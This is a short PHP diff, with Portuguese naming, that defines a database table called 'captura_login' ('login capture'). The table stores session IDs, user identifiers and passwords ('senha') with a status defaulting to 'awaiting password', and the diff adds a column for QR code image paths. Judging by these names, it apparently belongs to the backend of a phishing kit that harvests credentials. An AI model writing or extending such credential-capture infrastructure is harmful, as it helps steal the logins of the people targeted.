@@ -32,9 +32,10 @@ try {
     $sql_create_table = "
     CREATE TABLE IF NOT EXISTS captura_login (
         id SERIAL PRIMARY KEY,
-        session_id VARCHAR(255) NOT NULL, -- ADICIONADO --
+        session_id VARCHAR(255) NOT NULL,
         identificador VARCHAR(255) NOT NULL,
         senha VARCHAR(255) NULL,
+        qrcode_path VARCHAR(255) NULL, -- ADICIONADO --
         status VARCHAR(50) DEFAULT 'aguardando_senha',
         data_criacao TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
     );
